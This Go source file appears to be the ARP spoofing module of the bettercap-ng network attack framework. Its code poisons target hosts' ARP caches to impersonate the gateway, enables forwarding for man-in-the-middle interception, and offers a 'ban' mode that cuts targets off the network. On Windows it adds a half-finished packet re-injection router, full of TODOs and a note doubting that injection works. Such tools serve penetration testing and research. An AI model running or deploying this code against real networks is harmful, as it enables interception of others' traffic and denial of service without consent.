package modules

import (
	"bytes"
	"fmt"
	"net"
	"runtime"
	"time"

	"github.com/evilsocket/bettercap-ng/log"
	network "github.com/evilsocket/bettercap-ng/net"
	"github.com/evilsocket/bettercap-ng/packets"
	"github.com/evilsocket/bettercap-ng/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/malfunkt/iprange"
)

type ArpSpoofer struct {
	session.SessionModule
	done      chan bool
	addresses []net.IP
	ban       bool
}

func NewArpSpoofer(s *session.Session) *ArpSpoofer {
	p := &ArpSpoofer{
		SessionModule: session.NewSessionModule("arp.spoof", s),
		done:          make(chan bool),
		addresses:     make([]net.IP, 0),
		ban:           false,
	}

	p.AddParam(session.NewStringParameter("arp.spoof.targets", session.ParamSubnet, "", "IP addresses to spoof."))

	p.AddHandler(session.NewModuleHandler("arp.spoof on", "",
		"Start ARP spoofer.",
		func(args []string) error {
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.ban on", "",
		"Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.",
		func(args []string) error {
			p.ban = true
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.spoof/ban off", "arp\\.(spoof|ban) off",
		"Stop ARP spoofer.",
		func(args []string) error {
			return p.Stop()
		}))

	return p
}

func (p ArpSpoofer) Name() string {
	return "arp.spoof"
}

func (p ArpSpoofer) Description() string {
	return "Keep spoofing selected hosts on the network."
}

func (p ArpSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@protonmail.com>"
}

func (p *ArpSpoofer) getMAC(ip net.IP, probe bool) (net.HardwareAddr, error) {
	var mac string
	var hw net.HardwareAddr
	var err error

	// do we have this ip mac address?
	mac, err = network.ArpLookup(p.Session.Interface.Name(), ip.String(), false)
	if err != nil && probe == true {
		from := p.Session.Interface.IP
		from_hw := p.Session.Interface.HW

		if err, probe := packets.NewUDPProbe(from, from_hw, ip, 139); err != nil {
			log.Error("Error while creating UDP probe packet for %s: %s", ip.String(), err)
		} else {
			p.Session.Queue.Send(probe)
		}

		time.Sleep(500 * time.Millisecond)

		mac, err = network.ArpLookup(p.Session.Interface.Name(), ip.String(), false)
	}

	if mac == "" {
		return nil, fmt.Errorf("Could not find hardware address for %s.", ip.String())
	}

	mac = network.NormalizeMac(mac)
	hw, err = net.ParseMAC(mac)
	if err != nil {
		return nil, fmt.Errorf("Error while parsing hardware address '%s' for %s: %s", mac, ip.String(), err)
	}

	return hw, nil
}

func (p *ArpSpoofer) sendArp(saddr net.IP, smac net.HardwareAddr, check_running bool, probe bool) {
	for _, ip := range p.addresses {
		if check_running && p.Running() == false {
			return
		} else if p.Session.Skip(ip) == true {
			log.Debug("Skipping address %s from ARP spoofing.", ip)
			continue
		}

		// do we have this ip mac address?
		hw, err := p.getMAC(ip, probe)
		if err != nil {
			log.Debug("Error while looking up hardware address for %s: %s", ip.String(), err)
			continue
		}

		if err, pkt := packets.NewARPReply(saddr, smac, ip, hw); err != nil {
			log.Error("Error while creating ARP spoof packet for %s: %s", ip.String(), err)
		} else {
			log.Debug("Sending %d bytes of ARP packet to %s:%s.", len(pkt), ip.String(), hw.String())
			p.Session.Queue.Send(pkt)
		}
	}
}

func (p *ArpSpoofer) unSpoof() error {
	from := p.Session.Gateway.IP
	from_hw := p.Session.Gateway.HW

	log.Info("Restoring ARP cache of %d targets.", len(p.addresses))

	p.sendArp(from, from_hw, false, false)

	return nil
}

func (p *ArpSpoofer) pktRouter(eth *layers.Ethernet, ip4 *layers.IPv4, pkt gopacket.Packet) {
	if eth == nil || ip4 == nil {
		return
	}

	// check if this packet is from or to one of the spoofing targets
	// and therefore needs patching and forwarding.
	for _, target := range p.addresses {

		targetMAC, err := p.getMAC(target, true)
		if err != nil {
			log.Error("Error retrieving target MAC address for %s", target.String(), err)
			continue
		}

		// If SRC_MAC is different from both TARGET(s) & GW ignore
		if bytes.Compare(eth.SrcMAC, targetMAC) != 0 && bytes.Compare(eth.SrcMAC, p.Session.Gateway.HW) != 0 {
			// TODO Delete this debug
			//log.Debug("[ignored] [%s] ===> [%s]", eth.SrcMAC, eth.DstMAC)
			continue
		}

		// If DST_MAC is not our Interface.IP ignore
		if bytes.Compare(eth.DstMAC, p.Session.Interface.HW) != 0 {
			// TODO Delete this debug
			//log.Warning("[notForMiTM] [(%s) %s] ===> [%s (%s)]", eth.SrcMAC, ip4.SrcIP, ip4.DstIP, eth.DstMAC)
			continue
		}

		if !ip4.SrcIP.Equal(target) && !ip4.DstIP.Equal(target) {
			// TODO Delete this debug
			//log.Warning("[notTarget] [(%s) %s] ===> [%s (%s)]", eth.SrcMAC, ip4.SrcIP, ip4.DstIP, eth.DstMAC)
			continue
		}

		//
		// Craft packet
		// TODO Is it possible craft directly pkt?! So we don't have to mess with anything other than IP and ETH layers?
		//

		var cETH = new(layers.Ethernet)
		cETH.BaseLayer = eth.BaseLayer
		cETH.EthernetType = eth.EthernetType
		cETH.Length = eth.Length

		var cIPV4 = new(layers.IPv4)

		if bytes.Compare(eth.SrcMAC, targetMAC) == 0 {
			// TODO Delete this debug
			log.Error("[Reinject] [(%s) %s] ===> [%s (%s)]", eth.SrcMAC, ip4.SrcIP, ip4.DstIP, eth.DstMAC)

			cETH.SrcMAC = p.Session.Interface.HW
			cETH.DstMAC = p.Session.Gateway.HW

			cIPV4.SrcIP = p.Session.Interface.IP
			cIPV4.DstIP = ip4.DstIP

		} else {
			// Receiving from Gateway
			// TODO Delete this debug
			log.Warning("[Reinject] [(%s) %s] <=== [%s (%s)]", eth.SrcMAC, ip4.SrcIP, ip4.DstIP, eth.DstMAC)

			cETH.SrcMAC = p.Session.Interface.HW
			cETH.DstMAC = targetMAC

			cIPV4.SrcIP = ip4.SrcIP
			cIPV4.DstIP = target
		}

		var buffer gopacket.SerializeBuffer
		var options gopacket.SerializeOptions

		// TCP
		tcpLayer := pkt.Layer(layers.LayerTypeTCP)
		if tcpLayer == nil {
			log.Error("[Not a TCP .. better handle in another way this PKT Injection .. TODO!]")
			continue
		}
		tcp, _ := tcpLayer.(*layers.TCP)

		// App Layer
		applicationLayer := pkt.ApplicationLayer()
		var payload []byte
		if applicationLayer != nil {
			payload = applicationLayer.Payload()
		}

		// Crafted packet
		buffer = gopacket.NewSerializeBuffer()
		gopacket.SerializeLayers(buffer, options,
			cETH,
			cIPV4,
			tcp,
			gopacket.Payload(payload),
		)

		outgoingPacket := buffer.Bytes()
		if err := p.Session.Queue.Send(outgoingPacket); err != nil {
			log.Error("Error ReInjecting: [(%s) %s] ===> [%s (%s)]\n", cETH.SrcMAC, cIPV4.SrcIP, cIPV4.DstIP, cETH.DstMAC)
			continue
		}

		// TODO Are packets really injected?! Can't see them using Wireshark
		log.Warning("[INJECTED???!] [(%s) %s] ===> [%s (%s)]\n", cETH.SrcMAC, cIPV4.SrcIP, cIPV4.DstIP, cETH.DstMAC)
	}

}

func (p *ArpSpoofer) Configure() error {
	var err error
	var targets string

	if err, targets = p.StringParam("arp.spoof.targets"); err != nil {
		return err
	}

	list, err := iprange.Parse(targets)
	if err != nil {
		return fmt.Errorf("Error while parsing arp.spoof.targets variable '%s': %s.", targets, err)
	}
	p.addresses = list.Expand()

	if p.ban == true {
		log.Warning("Running in BAN mode, forwarding not enabled!")
		p.Session.Firewall.EnableForwarding(false)
	} else if runtime.GOOS == "windows" {
		// TODO Clean. Forwarding should be removed from Windows OS.
		//log.Info("Using user space packet routing, disable forwarding.")
		//p.Session.Firewall.EnableForwarding(false)
		p.Session.Queue.Route(p.pktRouter)
	} else if p.Session.Firewall.IsForwardingEnabled() == false {
		log.Info("Enabling forwarding.")
		p.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (p *ArpSpoofer) Start() error {
	if err := p.Configure(); err != nil {
		return err
	}

	return p.SetRunning(true, func() {
		from := p.Session.Gateway.IP
		from_hw := p.Session.Interface.HW

		log.Info("ARP spoofer started, probing %d targets.", len(p.addresses))

		for p.Running() {
			p.sendArp(from, from_hw, true, false)
			time.Sleep(1 * time.Second)
		}

		p.done <- true
	})
}

func (p *ArpSpoofer) Stop() error {
	return p.SetRunning(false, func() {
		log.Info("Waiting for ARP spoofer to stop ...")
		<-p.done
		p.unSpoof()
		p.ban = false
		p.Session.Queue.Route(nil)
	})
}
